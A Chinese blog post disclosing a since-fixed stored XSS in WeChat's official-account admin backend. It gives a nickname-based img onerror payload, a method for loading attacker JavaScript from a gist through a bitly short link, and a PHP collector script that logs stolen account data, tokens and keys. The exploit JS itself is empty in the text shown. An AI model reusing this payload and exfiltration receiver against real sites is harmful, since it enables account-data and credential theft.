---
layout: post
title: 微信公众号后台跨站漏洞 EXP (已修复)
---

{{ page.title }}
================
<p class="date">{{ page.date | date_to_string }} - evi1m0</p>


#### Vul Description

 - 提交时间：2014-08-19 15:04:14
 - 修复时间：2014-08-19 20:00:11
 
问题存在于微信公众号后台查看消息时用户名处的触发。


#### Bypass nickname length limit

微信对用户名进行了长度限制，使用安卓版微信可以绕过长度限制，这里测试使用的红米手机微信5.2：

![wechat_version](/images/FB10EC57-738D-4FB1-9A3D-E85E2E1EFBD8.png)


#### Detailed

绕过名字长度后，将微信用户名修改为：```test/*<img/src=@/onerror=alert(1)>```


之后我们考虑如何嵌入外部JS以方便的调试接下来要编写的Exploit，微信公众号后台使用https，需要引用外部的https js资源才行，之后我找到了：[https://bitly.com/shorten/](https://bitly.com/shorten/)

使用bitly将放置在github的https js资源连接进行网址缩短，例如：

	https://gist.githubusercontent.com/Evi1m0/497330da6935a30/raw/0c8ab3d6fec57c8052262e85c315549f1d0e869a/1.js
	
连接缩短：bit.ly/1dPaWIx ，生成后默认为http修改为https即可。

最后嵌入JS的长度为：

![wechat_xss_demo2](/images/258F0D1C-F712-4459-8040-B5CF7B641278.png)

#### Exploit

 - 获取公众号注册信息、登录邮箱等个人信息
 - 获取公众号粉丝数量
 - 普通模式则篡改自动回复的内容
 - 开发模式则偷取Key值和连接地址
 - 获取Token
 - More

```Wechat-exp.js```: 微信公众号后台使用jQuery，使用jQuery编写此exp。

{% highlight javascript %}
/*
{% endhighlight %}


```wxprobe.php```: 服务端接受获取内容

    <?php

    /*
     * Wechat probe
     * author: <evi1m0#ff0000.cc>
     * 20140313
     */

    @header("Content-Type:text/html;charset=utf8");
    if (!(isset($_GET['subject']) && $_GET['subject'] === 'wechat')) die;

    //获取信息
    $uin = urldecode($_GET['uin']);
    $item = urldecode($_GET['item']);
    $data = urldecode($_GET['data']);

    //判断创建
    if(!file_exists('./wxdata.html')){
        $fp = fopen('./wxdata.html', 'a+');
        fwrite($fp,'<head><meta http-equiv="Content-Type" Content="text/html; charset=utf8" /> <title>wxdata</title></head>');
    }
    $fp = fopen('./wxdata.html', 'a+');
    fwrite($fp, htmlspecialchars($uin). "| <br>item: ". htmlspecialchars($item). "<br>Data: ". htmlspecialchars($data). "<hr><br>");
    fclose($fp);

    ?>